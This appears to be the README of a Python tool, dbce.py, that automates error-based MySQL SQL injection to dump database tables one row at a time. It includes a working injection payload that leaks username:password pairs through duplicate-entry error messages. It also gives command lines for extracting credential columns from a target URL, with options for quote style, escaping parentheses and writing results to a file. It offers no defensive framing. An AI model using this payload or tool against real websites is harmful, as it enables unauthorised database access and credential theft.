Database Content Extractor
==========================

## Description
This is meant as a helper tool for those situations where you are only allowed to output a single row. For example inside error messages.

#### How does it work?
The way that the tool works is that it will append a query to the end of the defined target. This query will generate a MySQL error that includes the content pulled from the database.

#### Example

We wan't to extract the username and password of all the users in a database, but we are limited to extracting them one by one.

**The query**

    http://target/?id=1'+or+1+group+by+concat((select+concat(0x3c647164756d703e,concat_ws(0x3a,column1,column2),0x3c2f647164756d703e)+from+table+limit+X,1),0x00,ceil(rand(0)*2))+having+min(0)+--+-

**The output**

    Duplicate entry 'someuser:thepassword' for key 'group_key'

Now the script will go into a loop where on every loop it will increment the value of the LIMIT clause by 1 ...

    LIMIT 0,1
    LIMIT 1,1
    LIMIT 2,1
    .....

... until there's no more rows to return.

## Usage

**The very basics**

    python3 dbce.py -t http://target/?id=1 -T users -C username,password

**Changing format**

A site does not always use the single quote, so if you need to use double or no quote at all you change the format to either double or integer.

    python3 dbce.py -t http://target/?id=1 -T users -C username,password -f double
    python3 dbce.py -t http://target/?id=1 -T users -C username,password -f integer

**Prepending**

For example if a site is using parenthesis you need to escape out of it. This can be done by adding the prepend option

    python3 dbce.py -t http://target/?id=1 -T users -C username,password -p ")"

**Dump to file**

    python3 dbce.py -t http://target/?id=1 -T users -C username,password -o file

**Quiet mode**

When dumping to a file there's really no need to fill up your screen with all the extracted content.

    python3 dbce.py -t http://target/?id=1 -T users -C username,password -o file -q


## Options

    -t | --target=    Target website (i.e: http://www.target.com/?id=1)
    -T | --table=     Database table
    -C | --columns=   Columns to extract
    -f | --format=    What type of injection the tool needs to use. (Supported: single, double, integer)
                      Explained:
                      single  - Single quoted (Default)
                      double  - Double quoted
                      integer - No quote
    -p | --prepend=   Prepend custom injections
    -o | --output=    Write output to file
    -q | --quiet      Do not print results to the console

## Changelog
**v0.3**

* Fixed bugs
* Added two new parameters; output and quiet
    * Output (-o | --output) - Write output to file
    * Quiet (-q | --quiet) - Results will not be printed to the terminal

**v0.2**

* Added 2 new parameters; format and prepend
    * Valid formats: single, double and integer
    * Prepend custom payloads between parameter and default query
* Changed name since it's no longer just aimed at double query injection
* Added timer to see how long the process took
